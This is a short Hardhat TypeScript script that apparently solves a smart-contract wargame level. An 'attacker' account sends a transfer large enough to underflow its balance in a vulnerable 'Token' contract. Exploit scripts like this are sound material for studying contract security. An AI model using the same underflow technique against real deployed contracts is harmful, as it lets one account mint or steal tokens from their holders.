import { fail } from "assert";
import { BigNumber } from "ethers";
import { ethers } from "hardhat";
import { BLOCK_EXPLORER_URL, developmentNetworks } from "../hardhat.config";

const UINT_MAX = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
const SUB_AMOUNT = "115792089237316195423570985008687907853269984665640564039457584007913129639135"; // 800 tokens

async function tokenExploit() {
  const tokenAddress = process.env.TOKEN_ADDRESS || fail("TOKEN_ADDRESS Not Found In .env");
  const [attacker, attacker2] = await ethers.getSigners();
  const token = await ethers.getContractAt("Token", tokenAddress);
  const tx = await token.connect(attacker).transfer(attacker2.address, BigNumber.from(UINT_MAX).sub(SUB_AMOUNT));
  if (ethers.provider.network.name in developmentNetworks)
    console.log(`Transaction hash : ${BLOCK_EXPLORER_URL}/${tx.hash}`);
  await tx.wait();
  console.log(`SUCCESS!!! Submit the instance.`);
}

tokenExploit().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
